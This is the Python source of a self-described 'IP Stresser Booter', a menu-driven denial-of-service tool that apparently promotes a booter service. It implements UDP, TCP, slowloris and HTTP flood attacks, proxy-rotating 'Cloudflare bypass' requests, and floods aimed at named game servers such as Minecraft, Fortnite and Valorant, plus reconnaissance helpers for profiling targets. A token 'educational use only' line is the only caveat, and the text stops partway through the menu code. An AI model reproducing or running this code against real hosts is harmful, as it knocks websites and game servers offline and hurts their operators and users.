import socket
import random
import time
import requests
import os
import threading
import logging
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor

# Initialize Colorama for cross-platform color support
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format=f'{Fore.LIGHTBLUE_EX}[%(asctime)s] %(message)s{Style.RESET_ALL}', datefmt='%H:%M:%S')

# Set window title
os.system("title Free IP Stresser Booter V6 - Nightmare Stresser Edition")

# Modern ASCII Art with a sleek design
ASCII_ART = f"{Fore.LIGHTBLUE_EX}" \
            f"╔════════════════════════════════════╗\n" \
            f"║   Free IP Stresser Booter V6       ║\n" \
            f"║ Powered by nightmare-stresser.co   ║\n" \
            f"║ Advanced Network Testing Suite     ║\n" \
            f"╚════════════════════════════════════╝{Style.RESET_ALL}"

# Fetch HTTP proxies with improved error handling
def fetch_proxies():
    url = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        proxies = [p.strip() for p in response.text.splitlines() if ":" in p and p.strip()]
        logging.info(f"Loaded {len(proxies)} proxies")
        return proxies
    except requests.RequestException as e:
        logging.error(f"Proxy fetch failed: {e}")
        return []

PROXIES = fetch_proxies()

# Download daily HTTP proxy list
def download_proxy_list():
    url = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        with open("proxy_list.txt", "w") as f:
            f.write(response.text)
        logging.info("Proxy list downloaded to proxy_list.txt")
    except requests.RequestException as e:
        logging.error(f"Proxy list download failed: {e}")

# Utility function for socket creation with timeout
def create_socket(family=socket.AF_INET, sock_type=socket.SOCK_STREAM, timeout=5):
    sock = socket.socket(family, sock_type)
    sock.settimeout(timeout)
    return sock

# Enhanced attack class for better organization
class Stresser:
    def __init__(self, ip, port, duration, packet_size=1024):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.packet_size = packet_size
        self.end_time = time.time() + duration
        self.stats = {"packets": 0, "connections": 0, "requests": 0}

    def _udp_flood(self, payload):
        sock = create_socket(sock_type=socket.SOCK_DGRAM)
        try:
            while time.time() < self.end_time:
                sock.sendto(payload, (self.ip, self.port))
                self.stats["packets"] += 1
                time.sleep(0.001)
        except Exception as e:
            logging.error(f"UDP Flood Error: {e}")
        finally:
            sock.close()

    def _tcp_connect(self):
        sock = create_socket()
        try:
            while time.time() < self.end_time:
                sock.connect_ex((self.ip, self.port))
                self.stats["connections"] += 1
                sock.close()
                sock = create_socket()
                time.sleep(0.001)
        except Exception as e:
            logging.error(f"TCP Connect Error: {e}")
        finally:
            sock.close()

    def _tcp_flood(self, payload):
        sock = create_socket()
        try:
            sock.connect((self.ip, self.port))
            while time.time() < self.end_time:
                sock.send(payload)
                self.stats["packets"] += 1
                time.sleep(0.002)
        except Exception as e:
            logging.error(f"TCP Flood Error: {e}")
        finally:
            sock.close()

    def _http_request(self, url, method="GET", headers=None, data=None, use_proxies=False):
        headers = headers or {"User-Agent": "FreeStresserV6"}
        try:
            while time.time() < self.end_time:
                proxy = random.choice(PROXIES) if use_proxies and PROXIES else None
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                if method == "GET":
                    requests.get(url, headers=headers, proxies=proxies, timeout=2)
                elif method == "POST":
                    requests.post(url, headers=headers, data=data, proxies=proxies, timeout=2)
                self.stats["requests"] += 1
                time.sleep(0.01)
        except Exception as e:
            logging.error(f"HTTP Request Error: {e}")

# Game Methods
def minecraft_handshake(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(10)
    logging.info(f"Launching Minecraft Handshake Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def minecraft_login(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(5)
    logging.info(f"Launching Minecraft Login Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def pubg_packet(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"PUBG" + random.randbytes(100)
    logging.info(f"Launching PUBG Packet Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def pubg_connect(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    logging.info(f"Launching PUBG Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def blackops6_spam(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"BO6" + random.randbytes(50)
    logging.info(f"Launching Black Ops 6 Spam on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def cod_connect(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    logging.info(f"Launching COD Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def csgo_query(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"\xFF\xFF\xFF\xFF\x54Source Engine Query\x00"
    logging.info(f"Launching CS:GO Query Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def rust_connect(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    logging.info(f"Launching Rust Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def ark_spam(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"ARK" + random.randbytes(50)
    logging.info(f"Launching ARK Spam on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def fortnite_packet(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"FORT" + random.randbytes(80)
    logging.info(f"Launching Fortnite Packet Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def apex_connect(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    logging.info(f"Launching Apex Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def valorant_spam(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"VALO" + random.randbytes(60)
    logging.info(f"Launching Valorant Spam on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def gta_online_connect(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    logging.info(f"Launching GTA Online Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def roblox_query(ip, port, duration):
    stresser = Stresser(ip, port, duration)
    payload = b"RBX" + random.randbytes(70)
    logging.info(f"Launching Roblox Query Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

# Layer 4 UDP Methods
def udp_stdhex(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = bytes.fromhex("DEADBEEF") + random.randbytes(packet_size - 4)
    logging.info(f"Launching UDP StdHex Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_plain(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"A" * packet_size
    logging.info(f"Launching UDP Plain Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_bypass(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payloads = [random.randbytes(packet_size) for _ in range(10)]
    logging.info(f"Launching UDP Bypass Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(random.choice(payloads))
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_burst(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = random.randbytes(packet_size)
    logging.info(f"Launching UDP Burst Flood on {ip}:{port} for {duration}s")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(5):
            executor.submit(stresser._udp_flood, payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_storm(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"STORM" + random.randbytes(packet_size - 5)
    logging.info(f"Launching UDP Storm Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_rush(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = random.randbytes(packet_size)
    logging.info(f"Launching UDP Rush Flood on {ip}:{port} for {duration}s")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(10):
            executor.submit(stresser._udp_flood, payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_blast(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"BLAST" + random.randbytes(packet_size - 5)
    logging.info(f"Launching UDP Blast Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_amplification(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"\xFF\xFF\xFF\xFFgetstatus"  # Example for game server amplification
    logging.info(f"Launching UDP Amplification Flood on {ip}:{port} for {duration}s")
    stresser._udp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_reflection(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = random.randbytes(packet_size)
    logging.info(f"Launching UDP Reflection Flood on {ip}:{port} for {duration}s (Spoofed Source)")
    sock = create_socket(sock_type=socket.SOCK_DGRAM)
    try:
        while time.time() < stresser.end_time:
            sock.sendto(payload, (ip, port))
            stresser.stats["packets"] += 1
            time.sleep(0.001)
    except Exception as e:
        logging.error(f"UDP Reflection Error: {e}")
    finally:
        sock.close()
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

# Layer 4 TCP Methods
def tcp_bypass(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payloads = [random.randbytes(packet_size) for _ in range(5)]
    logging.info(f"Launching TCP Bypass Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(random.choice(payloads))
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def tcp_syn(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    logging.info(f"Launching TCP SYN Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def tcp_ack(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"\x00" * packet_size
    logging.info(f"Launching TCP ACK Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def tcp_connect(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    logging.info(f"Launching TCP Connect Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def tcp_wave(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"WAVE" + random.randbytes(packet_size - 4)
    logging.info(f"Launching TCP Wave Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def tcp_surge(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    logging.info(f"Launching TCP Surge Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def tcp_crush(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"CRUSH" + random.randbytes(packet_size - 5)
    logging.info(f"Launching TCP Crush Flood on {ip}:{port} for {duration}s")
    stresser._tcp_flood(payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def tcp_rapid_reset(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    payload = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: close\r\n\r\n"
    logging.info(f"Launching TCP Rapid Reset Flood on {ip}:{port} for {duration}s")
    with ThreadPoolExecutor(max_workers=20) as executor:
        for _ in range(20):
            executor.submit(stresser._tcp_flood, payload)
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def tcp_spoofed_syn(ip, port, duration, packet_size):
    stresser = Stresser(ip, port, duration, packet_size)
    logging.info(f"Launching TCP Spoofed SYN Flood on {ip}:{port} for {duration}s")
    stresser._tcp_connect()  # Simplified; real spoofing requires raw sockets
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

# Layer 7 HTTPS Methods
def slowloris(ip, duration):
    stresser = Stresser(ip, 80, duration)
    url = f"http://{ip}"
    logging.info(f"Launching Slowloris Attack on {url} for {duration}s")
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):
            executor.submit(stresser._http_request, url, headers={"Connection": "keep-alive"})
    logging.info(f"Completed: {stresser.stats['requests']} connections opened")

def http_spam(ip, duration):
    stresser = Stresser(ip, 80, duration)
    url = f"http://{ip}"
    logging.info(f"Launching HTTP Spam on {url} for {duration}s")
    stresser._http_request(url)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

def https_bypass(ip, duration):
    stresser = Stresser(ip, 443, duration)
    url = f"https://{ip}"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    ]
    headers = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}
    logging.info(f"Launching HTTPS Bypass on {url} for {duration}s (Proxies: {len(PROXIES)})")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for ua in user_agents:
            headers["User-Agent"] = ua
            executor.submit(stresser._http_request, url, headers=headers, use_proxies=True)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

def http_fury(ip, duration):
    stresser = Stresser(ip, 80, duration)
    url = f"http://{ip}/fury"
    logging.info(f"Launching HTTP Fury on {url} for {duration}s")
    stresser._http_request(url)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

def https_strike(ip, duration):
    stresser = Stresser(ip, 443, duration)
    url = f"https://{ip}/strike"
    headers = {"User-Agent": "FreeStresserV6"}
    logging.info(f"Launching HTTPS Strike on {url} for {duration}s")
    stresser._http_request(url, headers=headers)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

def http_overload(ip, duration):
    stresser = Stresser(ip, 80, duration)
    url = f"http://{ip}"
    data = random.randbytes(1024)
    logging.info(f"Launching HTTP Overload on {url} for {duration}s")
    stresser._http_request(url, method="POST", data=data)
    logging.info(f"Completed: {stresser.stats['requests']} POST requests sent")

def http_cf_bypass(ip, duration):
    stresser = Stresser(ip, 443, duration)
    url = f"https://{ip}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "CF-Connecting-IP": "127.0.0.1",
        "X-Forwarded-For": random.choice(["192.168.1.1", "10.0.0.1"])
    }
    logging.info(f"Launching HTTP Cloudflare Bypass on {url} for {duration}s")
    stresser._http_request(url, headers=headers, use_proxies=True)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

def http_bot_emulation(ip, duration):
    stresser = Stresser(ip, 80, duration)
    url = f"http://{ip}"
    headers = {
        "User-Agent": random.choice([
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }
    logging.info(f"Launching HTTP Bot Emulation on {url} for {duration}s")
    stresser._http_request(url, headers=headers, use_proxies=True)
    logging.info(f"Completed: {stresser.stats['requests']} requests sent")

# CheckHost Methods
def ping_check(ip):
    logging.info(f"Pinging {ip}")
    try:
        response = os.popen(f"ping -c 4 {ip}").read() if os.name != "nt" else os.popen(f"ping {ip} -n 4").read()
        print(f"{Fore.GREEN}Ping Results:{Style.RESET_ALL}\n{response}")
    except Exception as e:
        logging.error(f"Ping Error: {e}")

def http_check(url):
    logging.info(f"Checking HTTP status for {url}")
    try:
        response = requests.get(f"https://check-host.net/check-http?host={url}&max_nodes=3", headers={"Accept": "application/json"})
        data = response.json()
        request_id = data["request_id"]
        time.sleep(2)
        result = requests.get(f"https://check-host.net/check-result/{request_id}", headers={"Accept": "application/json"}).json()
        print(f"{Fore.GREEN}HTTP Check Results:{Style.RESET_ALL}")
        for node, res in result.items():
            status = f"Status {res[0][3]} ({res[0][2]}) in {res[0][1]:.3f}s" if res and res[0][0] == 1 else f"Failed - {res[0][2] if res else 'No response'}"
            print(f"{node}: {status}")
    except Exception as e:
        logging.error(f"HTTP Check Error: {e}")

def target_info(ip):
    logging.info(f"Fetching info for {ip}")
    try:
        response = requests.get(f"https://check-host.net/check-tcp?host={ip}:80&max_nodes=1", headers={"Accept": "application/json"})
        data = response.json()
        request_id = data["request_id"]
        nodes = data["nodes"]
        time.sleep(2)
        result = requests.get(f"https://check-host.net/check-result/{request_id}", headers={"Accept": "application/json"}).json()
        print(f"{Fore.GREEN}Target Info:{Style.RESET_ALL}")
        for node, details in nodes.items():
            print(f"IP: {ip}")
            print(f"Location: {details[1]} ({details[2]}, {details[3]})")
            print(f"Node IP: {details[4]}, ASN: {details[5]}")
            print(f"Connection Time: {result[node][0]['time']:.3f}s" if result[node] and "time" in result[node][0] else "Connection Failed")
    except Exception as e:
        logging.error(f"Target Info Error: {e}")

def url_to_ip(url):
    logging.info(f"Resolving IP for {url}")
    try:
        domain = url.split("://")[-1].split("/")[0]
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}Resolved IP:{Style.RESET_ALL} {ip}")
    except Exception as e:
        logging.error(f"URL to IP Error: {e}")

# API-Powered Tools
def ip_geolocation(ip):
    logging.info(f"Geolocating {ip}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data["status"] == "success":
            print(f"{Fore.GREEN}Geolocation:{Style.RESET_ALL}")
            print(f"IP: {ip}")
            print(f"Location: {data['country']} ({data['regionName']}, {data['city']})")
            print(f"ISP: {data['isp']}")
            print(f"Coordinates: {data['lat']}, {data['lon']}")
            print(f"Timezone: {data['timezone']}")
        else:
            logging.error(f"Geolocation Failed: {data['message']}")
    except Exception as e:
        logging.error(f"Geolocation Error: {e}")

def port_scanner(ip):
    logging.info(f"Scanning ports on {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/nmap/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}Port Scan Results:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"Port Scan Error: {e}")

def whois_lookup(domain):
    logging.info(f"Fetching WHOIS for {domain}")
    try:
        response = requests.get(f"https://api.whois.vu/?q={domain}", timeout=5)
        data = response.json()
        print(f"{Fore.GREEN}WHOIS Results:{Style.RESET_ALL}")
        print(f"Domain: {data.get('domain', domain)}")
        print(f"Registrar: {data.get('registrar', 'N/A')}")
        print(f"Created: {data.get('creation_date', 'N/A')}")
        print(f"Expires: {data.get('expiration_date', 'N/A')}")
        print(f"Registrant: {data.get('registrant_name', 'Private')}")
    except Exception as e:
        logging.error(f"WHOIS Error: {e}")

def dns_resolver(domain):
    logging.info(f"Resolving DNS for {domain}")
    try:
        headers = {"accept": "application/dns-json"}
        types = ["A", "AAAA", "MX", "NS"]
        for record_type in types:
            response = requests.get(f"https://1.1.1.1/dns-query?name={domain}&type={record_type}", headers=headers, timeout=5)
            data = response.json()
            answers = [ans["data"] for ans in data.get("Answer", [])]
            print(f"{Fore.GREEN}{record_type}:{Style.RESET_ALL} {', '.join(answers) if answers else 'No records'}")
    except Exception as e:
        logging.error(f"DNS Resolver Error: {e}")

def bandwidth_test(ip):
    logging.info(f"Testing bandwidth to {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/iperf/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}Bandwidth Test Results:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"Bandwidth Test Error: {e}")

def ssl_tls_checker(domain):
    logging.info(f"Checking SSL/TLS for {domain}")
    try:
        response = requests.get(f"https://api.ssllabs.com/api/v3/analyze?host={domain}", timeout=10)
        data = response.json()
        if "endpoints" in data:
            print(f"{Fore.GREEN}SSL/TLS Results:{Style.RESET_ALL}")
            for endpoint in data["endpoints"]:
                print(f"IP: {endpoint['ipAddress']}")
                print(f"Grade: {endpoint.get('grade', 'N/A')}")
                print(f"Details: {endpoint.get('details', 'N/A')}")
        else:
            logging.error("SSL/TLS Scan in progress or failed")
    except Exception as e:
        logging.error(f"SSL/TLS Error: {e}")

def traceroute(ip):
    logging.info(f"Tracing route to {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/traceroute/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}Traceroute Results:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"Traceroute Error: {e}")

def subdomain_finder(domain):
    logging.info(f"Finding subdomains for {domain}")
    try:
        response = requests.get(f"https://api.hackertarget.com/subdomain/?q={domain}", timeout=10)
        print(f"{Fore.GREEN}Subdomains:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"Subdomain Finder Error: {e}")

def ip_reputation(ip):
    logging.info(f"Checking reputation for {ip}")
    print(f"{Fore.YELLOW}Note: Requires AbuseIPDB API key (not implemented here){Style.RESET_ALL}")
    print(f"{Fore.GREEN}Sample Output: Reputation check would list abuse reports{Style.RESET_ALL}")

def website_screenshot(url):
    logging.info(f"Capturing screenshot for {url}")
    print(f"{Fore.YELLOW}Note: Requires ScreenshotMachine API key (not implemented here){Style.RESET_ALL}")
    print(f"{Fore.GREEN}Sample Output: Would provide screenshot URL{Style.RESET_ALL}")

def dns_leak_test():
    logging.info("Running DNS Leak Test")
    try:
        response = requests.get("https://bash.ws/dnsleak/test/", timeout=10)
        test_id = response.json()["id"]
        time.sleep(2)
        result = requests.get(f"https://bash.ws/dnsleak/test/{test_id}?json", timeout=10).json()
        print(f"{Fore.GREEN}DNS Leak Test Results:{Style.RESET_ALL}")
        for server in result:
            print(f"Server: {server['ip']} ({server['country']})")
    except Exception as e:
        logging.error(f"DNS Leak Test Error: {e}")

def http_headers_analyzer(url):
    logging.info(f"Analyzing headers for {url}")
    try:
        response = requests.get(f"https://api.hackertarget.com/httpheaders/?q={url}", timeout=10)
        print(f"{Fore.GREEN}HTTP Headers:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"HTTP Headers Error: {e}")

def ip_blacklist_check(ip):
    logging.info(f"Checking blacklist status for {ip}")
    print(f"{Fore.YELLOW}Note: Requires BlacklistChecker API key (not implemented here){Style.RESET_ALL}")
    print(f"{Fore.GREEN}Sample Output: Would list blacklist status{Style.RESET_ALL}")

def network_latency_test(ip):
    logging.info(f"Testing latency to {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/ping/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}Latency Results:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"Latency Test Error: {e}")

def vulnerability_scanner(ip):
    logging.info(f"Scanning vulnerabilities on {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/nmap/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}Vulnerability Scan:{Style.RESET_ALL}\n{response.text}")
        print(f"{Fore.YELLOW}Note: Basic scan; use dedicated tools for detailed analysis{Style.RESET_ALL}")
    except Exception as e:
        logging.error(f"Vulnerability Scan Error: {e}")

def ip_abuse_check(ip):
    logging.info(f"Checking abuse reports for {ip}")
    try:
        response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers={"Key": "YOUR_ABUSEIPDB_KEY", "Accept": "application/json"}, timeout=5)
        data = response.json()
        print(f"{Fore.GREEN}Abuse Check:{Style.RESET_ALL}")
        print(f"IP: {ip}")
        print(f"Reports: {data['data']['totalReports']}")
        print(f"Abuse Confidence: {data['data']['abuseConfidenceScore']}%")
    except Exception as e:
        logging.error(f"Abuse Check Error: {e} (API Key Required)")

def domain_reputation(domain):
    logging.info(f"Checking reputation for {domain}")
    try:
        response = requests.get(f"https://api.threatminer.org/v2/domain.php?q={domain}&rt=5", timeout=5)
        data = response.json()
        print(f"{Fore.GREEN}Domain Reputation:{Style.RESET_ALL}")
        print(f"Domain: {domain}")
        print(f"Related IPs: {', '.join(data['results'][:5]) if data['results'] else 'None'}")
    except Exception as e:
        logging.error(f"Domain Reputation Error: {e}")

def ip_neighbors(ip):
    logging.info(f"Finding neighbors for {ip}")
    try:
        response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
        print(f"{Fore.GREEN}IP Neighbors:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"IP Neighbors Error: {e}")

def ssl_cert_info(domain):
    logging.info(f"Fetching SSL cert info for {domain}")
    try:
        response = requests.get(f"https://api.ssllabs.com/api/v3/analyze?host={domain}", timeout=10)
        data = response.json()
        if "endpoints" in data:
            print(f"{Fore.GREEN}SSL Cert Info:{Style.RESET_ALL}")
            for endpoint in data["endpoints"]:
                print(f"IP: {endpoint['ipAddress']}")
                print(f"Grade: {endpoint.get('grade', 'N/A')}")
        else:
            logging.error("SSL Scan in progress or failed")
    except Exception as e:
        logging.error(f"SSL Cert Error: {e}")

def dns_propagation(domain):
    logging.info(f"Checking DNS propagation for {domain}")
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
        print(f"{Fore.GREEN}DNS Propagation:{Style.RESET_ALL}\n{response.text}")
    except Exception as e:
        logging.error(f"DNS Propagation Error: {e}")

# New Feature: Multi-threaded Attack Launcher
def launch_attack(method, *args):
    thread = threading.Thread(target=method, args=args)
    thread.start()
    return thread

# Input Validation
def validate_input(prompt, min_val, max_val, input_type=float):
    while True:
        try:
            value = input_type(input(f"{Fore.LIGHTBLUE_EX}{prompt}{Style.RESET_ALL}"))
            if min_val <= value <= max_val:
                return value
            logging.error(f"Value must be between {min_val} and {max_val}")
        except ValueError:
            logging.error("Invalid input! Use numbers only")

# Credits Display
def show_credits():
    print(f"{Fore.LIGHTBLUE_EX}{'='*40}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Free IP Stresser Booter V6{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Powered by: https://nightmare-stresser.co{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Version: 6.0{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Features: 14 Game, 9 UDP, 9 TCP, 8 HTTP, CheckHost, 20 Tools{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Legal: For educational use only on authorized systems{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX}{'='*40}{Style.RESET_ALL}")

# Main Menu
def main():
    username = input(f"{Fore.LIGHTBLUE_EX}Enter username: {Style.RESET_ALL}")
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(ASCII_ART)
    print(f"{Fore.LIGHTBLUE_EX}Welcome, {username}! Time: {current_time}{Style.RESET_ALL}\n")

    while True:
        print(f"{Fore.LIGHTBLUE_EX}Menu:{Style.RESET_ALL}")
        print("  1. Game Attacks")
        print("  2. Layer 4 UDP")
        print("  3. Layer 4 TCP")
        print("  4. Layer 7 HTTP/HTTPS")
        print("  5. CheckHost Diagnostics")
        print("  6. Network Tools")
        print("  7. Download Proxy List")
        print("  8. Credits")
        print("  0. Exit")
        print("  Type 'clear' to reset screen")
        choice = input(f"{Fore.LIGHTBLUE_EX}Select (0-8 or 'clear'): {Style.RESET_ALL}").strip().lower()

        if choice == "clear":
            os.system("cls" if os.name == "nt" else "clear")
            print(ASCII_ART)
            print(f"{Fore.LIGHTBLUE_EX}Welcome back, {username}! Time: {current_time}{Style.RESET_ALL}\n")
            continue

        if choice == "0":
            logging.info("Exiting program")
            break

        elif choice == "1":
            options = {
                "1": ("Minecraft Handshake", minecraft_handshake),
                "2": ("Minecraft Login", minecraft_login),
                "3": ("PUBG Packet", pubg_packet),
                "4": ("PUBG Connect", pubg_connect),
                "5": ("Black Ops 6 Spam", blackops6_spam),
                "6": ("COD Connect", cod_connect),
                "7": ("CS:GO Query", csgo_query),
                "8": ("Rust Connect", rust_connect),
                "9": ("ARK Spam", ark_spam),
                "10": ("Fortnite Packet", fortnite_packet),
                "11": ("Apex Connect", apex_connect),
                "12": ("Valorant Spam", valorant_spam),
                "13": ("GTA Online Connect", gta_online_connect),
                "14": ("Roblox Query", roblox_query)
            }
            print(f"{Fore.LIGHTBLUE_EX}Game Attacks:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
